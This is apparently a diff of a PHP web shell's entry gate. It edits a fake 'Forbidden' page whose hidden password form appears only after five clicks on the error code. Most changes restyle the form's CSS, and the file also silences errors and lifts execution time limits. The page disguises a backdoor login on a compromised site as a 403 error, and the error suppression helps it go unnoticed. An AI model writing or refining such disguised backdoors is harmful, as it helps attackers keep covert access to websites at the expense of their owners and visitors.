@@ -24,36 +24,44 @@ function show_login_page() {
   #passwordField {
     display: none;
     margin-top: 20px;
-    opacity: 0;
-    transition: opacity 0.5s ease-in-out;
   }
-  #passwordField.show {
-    opacity: 1;
-  }
-  input[type="password"], input[type="submit"] {
+
+  /* Styling for the password input and submit button */
+  input[type="password"] {
     padding: 10px;
-    font-size: 16px;
     width: 80%;
-    margin: 10px 0;
-    border-radius: 5px;
-    border: 1px solid rgba(255, 255, 255, 0.3);
-    background: rgba(255, 255, 255, 0.1);
-    color: #fff;
-    backdrop-filter: blur(5px);
-    transition: background 0.3s ease;
+    max-width: 300px;
+    font-size: 16px;
+    margin-bottom: 10px;
+    border: 2px solid #ccc;
+    border-radius: 4px;
+    box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+    transition: border-color 0.3s ease;
   }
-  input[type="password"]::placeholder {
-    color: rgba(255, 255, 255, 0.6);
+
+  input[type="password"]:focus {
+    border-color: #007bff;
+    outline: none;
   }
-  input[type="password"]:focus, input[type="submit"]:hover {
-    background: rgba(255, 255, 255, 0.3);
-  }
+
   input[type="submit"] {
+    background-color: #007bff;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 16px;
+    border-radius: 4px;
     cursor: pointer;
-    background-color: rgba(255, 255, 255, 0.2);
+    transition: background-color 0.3s ease;
   }
+
   input[type="submit"]:hover {
-    background-color: rgba(255, 255, 255, 0.4);
+    background-color: #0056b3;
+  }
+
+  #passwordField form {
+    display: inline-block;
+    margin-top: 10px;
   }
 </style>
 </head>
@@ -67,7 +75,7 @@ function show_login_page() {
     <!-- Hidden password input below Forbidden -->
     <div id="passwordField">
       <form method="post">
-        <input type="password" name="pass" placeholder="Enter password">
+        <input type="password" name="pass" placeholder="Enter password" required>
         <input type="submit" value="Submit">
       </form>
     </div>
@@ -87,7 +95,7 @@ function show_login_page() {
   forbiddenCode.addEventListener('click', () => {
     clickCount++;
     if (clickCount === 5) {
-      passwordField.classList.add('show'); // Show the password field with fade-in effect
+      passwordField.style.display = 'block'; // Show the password field
     }
   });
 </script>
@@ -120,6 +128,7 @@ if (!isset($_SESSION['authenticated'])) {
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
+
 # function WAF
 
 $Array = [
